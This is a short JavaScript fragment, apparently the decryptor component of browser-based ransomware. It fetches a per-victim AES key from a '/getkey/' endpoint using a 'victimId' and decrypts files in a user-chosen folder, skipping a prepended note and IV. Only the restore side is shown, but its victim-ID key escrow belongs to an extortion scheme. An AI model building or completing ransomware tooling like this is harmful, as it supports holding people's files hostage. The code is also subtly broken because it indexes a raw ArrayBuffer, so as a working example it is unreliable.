async function restore() {
  const log = document.getElementById("log");
  const victimId = document.getElementById("victimId").value;

  log.textContent = `⏳ Trying victim ID: ${victimId}\n`;

  const res = await fetch(`/getkey/${victimId}`);
  if (!res.ok) {
    log.textContent += `❌ Key not found on server!\n`;
    return;
  }

  const aesKeyRaw = await res.arrayBuffer();
  const aesKey = await crypto.subtle.importKey("raw", aesKeyRaw, { name: "AES-GCM" }, false, ["decrypt"]);

  const dirHandle = await window.showDirectoryPicker();
  for await (const entry of dirHandle.values()) {
    if (entry.kind === "file") {
      try {
        const file = await entry.getFile();
        const data = await file.arrayBuffer();

        const noteLen = data[0];
        const ivLen = data[1];
        const iv = new Uint8Array(data.slice(2 + noteLen, 2 + noteLen + ivLen));
        const ciphertext = data.slice(2 + noteLen + ivLen);

        const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, ciphertext);
        const writable = await entry.createWritable();
        await writable.write(decrypted);
        await writable.close();

        log.textContent += `✔️ Restored: ${entry.name}\n`;
      } catch (err) {
        log.textContent += `❌ Failed: ${entry.name} (${err.message})\n`;
      }
    }
  }
}
